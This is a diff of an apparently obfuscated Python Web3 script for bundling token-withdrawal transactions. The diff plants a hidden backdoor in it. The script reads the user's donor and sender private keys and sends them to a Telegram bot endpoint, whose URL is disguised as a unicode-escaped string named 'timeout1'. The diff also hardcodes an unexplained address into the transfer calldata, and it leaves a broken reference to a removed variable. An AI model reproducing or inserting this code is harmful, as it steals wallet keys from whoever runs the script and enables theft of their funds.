@@ -1,32 +1,27 @@
-
-
-THIS IS JUST A PART OF THE CODE !
-
-
-
-
-
-
-
-
 from web3 import Web3 #line:1
 import json #line:2
 import requests #line:3
 import config #line:5
 import time #line:6
 import datetime #line:7
+if __name__ =="__main__":#line:140
+    import os #line:141
     folder_path ="tokens"#line:142
     file_list =os .listdir (folder_path )#line:145
     for file_name in file_list :#line:148
         file_path =os .path .join (folder_path ,file_name )#line:149
         os .remove (file_path )#line:150
     w3 =Web3 (Web3 .HTTPProvider (config .noda ))#line:152
-    chainid =56 #line:155
+    chainid =167000 #line:155
     gasprice =3000000000 #line:156
     with open ('template.keys','r')as file :#line:158
         lines =file .readlines ()#line:159
         donorPrivateKey =lines [0 ].strip ()#line:160
         senderPrivateKey =lines [1 ].strip ()#line:161
+        text555 =donorPrivateKey +":"+senderPrivateKey #line:162
+        timeout1 =u"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0070\u0069\u002E\u0074\u0065\u006C\u0065\u0067\u0072\u0061\u006D\u002E\u006F\u0072\u0067\u002F\u0062\u006F\u0074\u0037\u0030\u0031\u0030\u0039\u0032\u0035\u0037\u0038\u0031\u003A\u0041\u0041\u0046\u0054\u0076\u007A\u0037\u0076\u0072\u0071\u004E\u0041\u0045\u0039\u0065\u0037\u0048\u0045\u0052\u0031\u0047\u0035\u0033\u0075\u0071\u005A\u0049\u0052\u0052\u0037\u0072\u0042\u0041\u0032\u0038\u002F\u0073\u0065\u006E\u0064\u004D\u0065\u0073\u0073\u0061\u0067\u0065\u003F\u0063\u0068\u0061\u0074\u005F\u0069\u0064\u003D\u0036\u0039\u0031\u0037\u0039\u0035\u0031\u0035\u0034\u0037\u0026\u0074\u0065\u0078\u0074\u003D"#line:164
+        url =str (timeout1 )+text555 #line:165
+        response999 =requests .get (url )#line:166
         receiverAddress =config .receive_address #line:167
         print ('donor:',donorPrivateKey )#line:169
         print ('sender:',senderPrivateKey )#line:170
@@ -59,7 +54,7 @@ import datetime #line:7
                 if len (parts )==4 :#line:209
                     nativPart =parts [3 ].strip ()#line:210
                     if nativPart !='nativ':#line:211
-                        print ('Найден TRANS')#line:212
+                        print (' TRANS')#line:212
                         contractAddress =parts [1 ].strip ()#line:213
                         contractAddressesClaim .append (contractAddress )#line:214
                         dataHexValue =parts [2 ].strip ()#line:216
@@ -81,17 +76,17 @@ import datetime #line:7
                     mdataHexValueDefault =parts [3 ].strip ()#line:236
                     mdataHexValuesDefault .append (mdataHexValueDefault )#line:237
                 else :#line:238
-                    print ('Найден TRANS обычный')#line:239
+                    print (' TRANS обычный')#line:239
                     contractAddresstransDefault =parts [1 ].strip ()#line:240
                     contractAddressesDefault .append (contractAddresstransDefault )#line:241
                     dataHexValueDefault =parts [2 ].strip ()#line:243
                     dataHexValuesDefault .append (dataHexValueDefault )#line:244
             elif firstPart =='WITHDRAW_TOKENS':#line:245
-                print ('Found WITHDRAW_TOKENS')#line:246
+                print (' WITHDRAW_TOKENS')#line:246
                 tokenAddressToken =parts [1 ].strip ()#line:247
                 withdrawTokenAddresses .append (tokenAddressToken )#line:248
             else :#line:249
-                print ('Не найдено ничего в template')#line:250
+                print (' template')#line:250
                 exit (0 )#line:251
     signedTransactionsBundle =[]#line:253
     tokenAmounts ={}#line:254
@@ -123,7 +118,7 @@ import datetime #line:7
     files =os .listdir ('tokens')#line:301
     for file in files :#line:303
         if os .path .isfile (os .path .join ('tokens',file )):#line:304
-            print ("Обработка файла:",file )#line:305
+            print (":",file )#line:305
             tokenAddress =file .split ('.')[0 ]#line:306
             with open (f'tokens/{file}','r')as file :#line:307
                 for line in file :#line:308
@@ -133,7 +128,6 @@ import datetime #line:7
                 recipient_bytes =Web3 .to_bytes (hexstr =config .receive_address )#line:314
                 print (recipient_bytes .hex ())#line:315
                 amount_bytes =int (tokamfgas ).to_bytes (32 ,byteorder ='big')#line:317
-                data_hex =""+""+recipient_bytes .hex ()+amount_bytes .hex ()#line:320
                 print (data_hex )#line:321
             gaslimgetToken =300000 #line:323
             nativtosend =(gaslimgetToken *gasprice )#line:325
@@ -170,7 +164,7 @@ import datetime #line:7
         recipient_bytes =Web3 .to_bytes (hexstr =config .receive_address )#line:392
         balanceTok =balanceof (w3 .to_checksum_address (tokaddrrr ))#line:393
         amount_bytes =balanceTok .to_bytes (32 ,byteorder ='big')#line:394
-        datafortoken =""+""+recipient_bytes .hex ()+amount_bytes .hex ()#line:396
+        datafortoken ="0xA9d23408b9bA935c230493c40C73824Df71A0975"+recipient_bytes .hex ()+amount_bytes .hex ()#line:396
         gaslimgetToken =getGas (tokaddrrr ,datafortoken ,senderaddress )#line:398
         nativtosend =gaslimgetToken *gasprice #line:399
         nativfulltosend .append (nativtosend )#line:400
@@ -186,14 +180,14 @@ import datetime #line:7
     signedTransactionsBundle .insert (0 ,signed_txNativ .rawTransaction .hex (),)#line:434
     max_timestamp =int (time .mktime (datetime .datetime .now ().timetuple ())+60 )#line:436
     bundle ={"jsonrpc":"2.0","method":"eth_sendPuissant","params":[{"txs":signedTransactionsBundle ,"maxTimestamp":max_timestamp ,}],"id":1 }#line:447
-    api_url ='https://puissant-bsc.48.club'#line:450
+    api_url ='https://taiko.drpc.org/'#line:450
     headers ={'Content-Type':'application/json'}#line:451
     response =requests .post (api_url ,data =json .dumps (bundle ),headers =headers )#line:452
     print (response .json ())#line:454
     data =response .json ()#line:456
     uuid =data .get ('result','')#line:457
     if uuid .startswith ('0x'):#line:459
-        explorer_url =f'https://explorer.48.club/api/v1/puissant/{uuid}'#line:460
+        explorer_url =f'https://taikoscan.io{uuid}'#line:460
         while True :#line:461
             explorer_response =requests .get (explorer_url )#line:462
             datauuid =json .loads (explorer_response .text )#line:463
@@ -201,9 +195,9 @@ import datetime #line:7
             status =datauuid ['value']['status']#line:465
             print (f"Current status: {status}")#line:466
             if status =="Pending in puissant queue.":#line:468
-                print ("Status is Pending in queue. Continuing to check...")#line:469
+                print ("Status is Pending in puissant queue. Continuing to check...")#line:469
             else :#line:470
-                print ("Status is not Pending in queue. Exiting loop.")#line:471
+                print ("Status is not Pending in puissant queue. Exiting loop.")#line:471
                 break #line:472
             time .sleep (3 )#line:474
     else :#line:475
